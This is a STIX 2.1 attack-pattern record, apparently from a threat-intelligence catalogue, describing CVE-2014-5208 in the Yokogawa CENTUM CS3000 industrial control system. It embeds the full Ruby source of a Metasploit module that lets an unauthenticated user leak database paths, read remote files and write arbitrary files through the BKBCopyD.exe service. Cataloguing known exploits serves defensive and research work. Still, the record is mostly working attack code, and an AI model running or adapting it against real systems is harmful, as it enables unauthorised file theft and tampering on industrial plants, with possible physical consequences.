{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cf9940bf-adfd-42fe-99c6-0a231a247767",
    "created": "2024-08-14T16:22:21.69409Z",
    "modified": "2024-08-14T16:22:21.694094Z",
    "name": "Yokogawa BKBCopyD.exe Client",
    "description": " This module allows an unauthenticated user to interact with the Yokogawa CENTUM CS3000 BKBCopyD.exe service through the PMODE, RETR and STOR operations. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/yokogawa_bkbcopyd_client.rb",
            "external_id": "yokogawa_bkbcopyd_client.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5208"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/08/09/r7-2014-10-disclosure-yokogawa-centum-cs3000-bkbcopydexe-file-system-access"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Yokogawa BKBCopyD.exe Client',\n      'Description'    => %q{\n        This module allows an unauthenticated user to interact with the Yokogawa\n        CENTUM CS3000 BKBCopyD.exe service through the PMODE, RETR and STOR\n        operations.\n      },\n      'Author'         =>\n        [ 'Unknown' ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-5208' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2014/08/09/r7-2014-10-disclosure-yokogawa-centum-cs3000-bkbcopydexe-file-system-access']\n        ],\n      'Actions'     =>\n        [\n          ['PMODE', { 'Description' => 'Leak the current database' }],\n          ['RETR',  { 'Description' => 'Retrieve remote file' }],\n          ['STOR',  { 'Description' => 'Store remote file' }]\n        ],\n      'DisclosureDate' => '2014-08-09'))\n\n    register_options(\n      [\n        Opt::RPORT(20111),\n        OptString.new('RPATH', [ false, 'The Remote Path (required to RETR and STOR)', \"\" ]),\n        OptPath.new('LPATH', [ false, 'The Local Path (required to STOR)' ])\n      ])\n  end\n\n  def srvport\n    @srvport\n  end\n\n  def run\n    exploit\n  end\n\n  def exploit\n    @srvport = rand(1024..65535)\n    print_status(\"#{@srvport}\")\n    # We make the client connection before giving control to the TCP Server\n    # in order to release the src port, so the server can start correctly\n\n    case action.name\n    when 'PMODE'\n      print_status(\"Sending PMODE packet...\")\n      data = \"PMODE MR_DBPATH\\n\"\n      res = send_pkt(data)\n      if res and res =~ /^210/\n        print_good(\"Success: #{res}\")\n      else\n        print_error(\"Failed...\")\n      end\n      return\n    when 'RETR'\n      data = \"RETR #{datastore['RPATH']}\\n\"\n      print_status(\"Sending RETR packet...\")\n      res = send_pkt(data)\n      return unless res and res =~ /^150/\n    when 'STOR'\n      data = \"STOR #{datastore['RPATH']}\\n\"\n      print_status(\"Sending STOR packet...\")\n      res = send_pkt(data)\n      return unless res and res =~ /^150/\n    else\n      print_error(\"Incorrect action\")\n      return\n    end\n\n    super # TCPServer :)\n  end\n\n  def send_pkt(data)\n    connect(true, {'CPORT' => @srvport})\n    sock.put(data)\n    data = sock.get_once\n    disconnect\n\n    return data\n  end\n\n  def on_client_connect(c)\n    if action.name == 'STOR'\n      contents = \"\"\n      File.new(datastore['LPATH'], \"rb\") { |f| contents = f.read }\n      print_status(\"#{c.peerhost} - Sending data...\")\n      c.put(contents)\n      self.service.close\n      self.service.stop\n    end\n  end\n\n  def on_client_data(c)\n    print_status(\"#{c.peerhost} - Getting data...\")\n    data = c.get_once\n    return unless data\n    if @store_path.blank?\n      @store_path = store_loot(\"yokogawa.cs3000.file\", \"application/octet-stream\", rhost, data, datastore['PATH'])\n      print_good(\"#{@store_path} saved!\")\n    else\n      File.open(@store_path, \"ab\") { |f| f.write(data) }\n      print_good(\"More data on #{@store_path}\")\n    end\n  end\n\n  def on_client_close(c)\n    cleanup_service\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-08-09"
}